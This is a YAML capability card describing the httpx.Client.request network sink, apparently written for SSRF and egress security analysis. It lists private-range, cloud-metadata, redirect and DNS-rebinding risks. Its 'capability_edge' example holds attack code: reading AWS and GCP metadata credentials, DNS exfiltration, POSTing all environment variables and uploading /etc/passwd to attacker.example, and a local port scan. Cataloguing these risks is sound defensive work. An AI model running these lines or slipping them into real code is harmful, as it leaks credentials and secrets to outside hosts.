# httpx.Client.request

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-c29f5984d333c4dc
api: httpx.Client.request
api_family: httpx.Client.request
runtime:
  language: python
  ecosystem: python-runtime
  package: httpx
  version: legacy-source-bound
capability_class: network-egress
normative_authority: capability-facts-only
bound_sinks:
- httpx.Client.get
- httpx.Client.post
- httpx.Client.put
- httpx.Client.patch
- httpx.Client.delete
- httpx.Client.head
- httpx.Client.options
- httpx.Client.stream
roles:
- role_id: content
  description: Legacy controlled role content.
  bindings:
  - expression: content
    caller_bindable: true
- role_id: destination-url
  description: Legacy controlled role destination-url.
  bindings:
  - expression: url
    caller_bindable: true
- role_id: headers
  description: Legacy controlled role headers.
  bindings:
  - expression: headers
    caller_bindable: true
- role_id: query-parameters
  description: Legacy controlled role query-parameters.
  bindings:
  - expression: params
    caller_bindable: true
- role_id: request-body
  description: Legacy controlled role request-body.
  bindings:
  - expression: data
    caller_bindable: true
  - expression: json
    caller_bindable: true
facets:
- facet_id: legacy-facet-8ffe4691
  capability: Issue an arbitrary HTTP request from the host process to any reachable URL, using any HTTP method (GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS, CONNECT via custom method string).
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-27792ce0
  capability: Reach private/internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16) and link-local addresses — the library performs standard TCP connect(), so any network-accessible host the process can reach is reachable.
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-13473f85
  capability: 'Reach cloud-instance metadata endpoints: AWS (169.254.169.254), GCP (metadata.google.internal, 169.254.169.254), Azure (169.254.169.254), DigitalOcean, Alibaba Cloud, Oracle Cloud, and any other IMDSv1/v2 endpoint.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-116afe73
  capability: Exfiltrate data via the request body (POST/PUT/PATCH with data, json, files, or content parameters), URL path, query string (params), custom headers, or cookies.
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-b740a0d2
  capability: 'Exfiltrate via DNS: the hostname in the URL triggers a DNS lookup; an attacker-controlled subdomain (e.g. exfil-<data>.attacker.example) leaks data to the authoritative DNS server.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-f7e49c57
  capability: Upload arbitrary local files to a remote server via the files= parameter (multipart file upload, or direct binary body via content=).
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-6ca164a0
  capability: Set arbitrary HTTP headers including Host, X-Forwarded-For, Authorization, Content-Type, and custom headers — enabling header-injection-like behavior, virtual-host routing attacks, and credential forwarding.
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-3bf4bdd1
  capability: 'Send arbitrary JSON payloads via json= (auto-serialized with Content-Type: application/json).'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-564579cd
  capability: Send URL-encoded or multipart form data via data=.
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-b15dda1f
  capability: Inject query parameters (params=) independently of the URL base, enabling parameter pollution or override of intended query semantics.
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-548d91c1
  capability: Inject cookies (cookies=) that are merged into the request Cookie header, enabling session fixation, session riding, or credential forwarding.
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-90033416
  capability: 'Control authentication (auth=): Basic Auth, Digest Auth, Bearer token, or custom auth classes — attacker-controlled credentials or token forwarding.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-22d6222a
  capability: Follow HTTP redirects (3xx) by default (follow_redirects defaults to True on the Client, max 20 redirects). Redirect-following automatically re-issues the request to the redirect target, including cross-origin and cross-scheme, and replays the body on 307/308 — enabling SSRF bypass via open-redirector chains.
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-edbff3f7
  capability: 'Perform blind SSRF: even if the response body is not returned to the attacker, the side effect of the connection itself (establishing a TCP handshake, DNS resolution, TLS handshake) is sufficient for port-scanning, service discovery, and latency-based oracle attacks.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-242f7c60
  capability: 'Perform semi-blind SSRF: response status code, headers, timing, and error messages are observable, enabling differential analysis of internal services.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-2575d421
  capability: 'Perform non-blind SSRF: the full response (status, headers, body) is returned as an httpx.Response object and may be consumed by downstream code.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-bf6fde61
  capability: 'Exploit DNS rebinding / TOCTOU: the DNS name in the URL is resolved at connect time; if the DNS record changes between a pre-connect check and the actual connect(), the connection targets a different IP — a TOCTOU window inherent to the library''s DNS resolution model.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-361a38bc
  capability: 'Use non-standard ports: any TCP port can be specified in the URL (http://host:8080, https://host:8443, http://host:6379 for Redis, http://host:3306 for MySQL handshake probing, etc.).'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-fc3c31b3
  capability: 'Speak raw TCP to non-HTTP services: if the URL scheme is http:// or https://, httpx sends a well-formed HTTP request; receiving a response from a non-HTTP service (e.g. Redis, Memcached, SMTP, FastCGI) may trigger protocol confusion or crash the service, and the raw response bytes are captured in the Response object.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-7b8b981d
  capability: 'Use CONNECT method for TCP tunneling: by passing method=''CONNECT'' and an arbitrary host:port as the URL, the library issues an HTTP CONNECT request — useful for establishing tunnels through forward proxies to arbitrary backend hosts.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-f2bef85e
  capability: Control request timeout (timeout=) — can set extremely short or long timeouts to probe service availability or cause resource exhaustion.
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-42dcf9e9
  capability: Stream large responses without buffering (stream() variant) — enables pulling large data sets from internal services without memory pressure on the attacker process.
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-49716895
  capability: 'Inherit environment-configured proxies: if the Client was created with trust_env=True (default), the HTTP_PROXY, HTTPS_PROXY, NO_PROXY, and ALL_PROXY environment variables are honored, potentially routing requests through attacker-influenced proxy servers.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-a6c278f0
  capability: Reuse connections (connection pooling, HTTP keepalive) across multiple requests made through the same Client instance, enabling stateful interactions with internal services (e.g. login-first-then-access patterns).
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-b4894933
  capability: Use HTTP/2 if enabled on the Client (http2=True), including multiplexed streams to the same host.
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-21f1a664
  capability: 'Control TLS verification (via Client(verify=...)): if the Client was created with verify=False or a custom SSLContext, TLS certificate validation is disabled, enabling MITM interception of ostensibly-HTTPS targets.'
  role_ids:
  - content
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-30403f63
  role_id: null
  value: follow_redirects defaults to True on the Client (httpx.Client(follow_redirects=True)), so redirect-following is ON by default for all request() calls that do not explicitly override it.
  security_effect: follow_redirects defaults to True on the Client (httpx.Client(follow_redirects=True)), so redirect-following is ON by default for all request() calls that do not explicitly override it.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-bdcd0862
  role_id: null
  value: max_redirects defaults to 20 on the Client (httpx.Client(max_redirects=20)).
  security_effect: max_redirects defaults to 20 on the Client (httpx.Client(max_redirects=20)).
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-a5445442
  role_id: null
  value: trust_env defaults to True on the Client, so HTTP_PROXY / HTTPS_PROXY / NO_PROXY environment variables are read by default.
  security_effect: trust_env defaults to True on the Client, so HTTP_PROXY / HTTPS_PROXY / NO_PROXY environment variables are read by default.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-f2545ac2
  role_id: null
  value: verify defaults to True on the Client (standard CA bundle), but an attacker who controls Client construction can disable it.
  security_effect: verify defaults to True on the Client (standard CA bundle), but an attacker who controls Client construction can disable it.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-74ff97bb
  role_id: null
  value: DNS resolution is synchronous and uses the system resolver (getaddrinfo); there is no DNS rebinding protection built into httpx.
  security_effect: DNS resolution is synchronous and uses the system resolver (getaddrinfo); there is no DNS rebinding protection built into httpx.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-94b4a0e4
  role_id: null
  value: The library automatically sets Content-Type and Content-Length headers based on the body parameters (json= sets application/json, data= sets application/x-www-form-urlencoded or multipart/form-data, files= sets multipart/form-data).
  security_effect: The library automatically sets Content-Type and Content-Length headers based on the body parameters (json= sets application/json, data= sets application/x-www-form-urlencoded or multipart/form-data, files= sets multipart/form-data).
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-dc80595d
  role_id: null
  value: The library automatically sets the Host header from the URL.
  security_effect: The library automatically sets the Host header from the URL.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-5d78c578
  role_id: null
  value: Cookies set via cookies= are merged with any cookies already in the Client's cookie jar; the Client persists cookies across requests by default.
  security_effect: Cookies set via cookies= are merged with any cookies already in the Client's cookie jar; the Client persists cookies across requests by default.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-746d7f12
  role_id: null
  value: The url parameter accepts str, bytes, or httpx.URL; IPv6 addresses in brackets are parsed correctly, enabling IPv6-only internal service access.
  security_effect: The url parameter accepts str, bytes, or httpx.URL; IPv6 addresses in brackets are parsed correctly, enabling IPv6-only internal service access.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-459c3a2d
  role_id: null
  value: The method parameter is case-insensitive; any string is accepted including non-standard methods.
  security_effect: The method parameter is case-insensitive; any string is accepted including non-standard methods.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: '# Normal HTTPS GET request

    import httpx

    client = httpx.Client()

    response = client.request("GET", "https://api.example.com/data")

    print(response.json())

    '
  capability_edge: "# SSRF: read AWS EC2 metadata (IMDSv1)\nimport httpx\nclient = httpx.Client(timeout=5)\nr = client.request(\"GET\", \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\nprint(r.text)\n\n# SSRF via redirect: open-redirector chain — library follows by default\nr = client.request(\"GET\", \"https://trusted.example/redirect?url=http://169.254.169.254/\")\n\n# Exfil via DNS: the hostname triggers a DNS lookup\nclient.request(\"GET\", \"http://exfil-secret-db-password.attacker.example/\")\n\n# Exfil via request body (POST with data)\nimport os\nsecrets = os.environ.copy()\nclient.request(\"POST\", \"https://attacker.example/collect\", json=secrets)\n\n# Internal port scan / service discovery via timing oracle\nfor port in [22, 80, 443, 3306, 6379, 8080, 9200, 27017]:\n    try:\n        r = client.request(\"GET\", f\"http://127.0.0.1:{port}\", timeout=0.5)\n        print(f\"Port {port} OPEN (HTTP {r.status_code})\")\n    except Exception as e:\n        pass\
    \  # closed / filtered / non-HTTP — timing still leaks\n\n# CONNECT tunnel through forward proxy\nr = client.request(\"CONNECT\", \"http://internal.corp:8080/\")\n\n# GCP metadata (with required header)\nr = client.request(\"GET\", \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\",\n                   headers={\"Metadata-Flavor\": \"Google\"})\n\n# File upload — exfiltrate local file\nclient.request(\"POST\", \"https://attacker.example/upload\",\n               files={\"file\": open(\"/etc/passwd\", \"rb\")})\n"
provenance:
- https://www.python-httpx.org/api/#client
- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- https://cwe.mitre.org/data/definitions/918.html
- 'httpx v0.28.1 source: _client.py Client.request()'
```
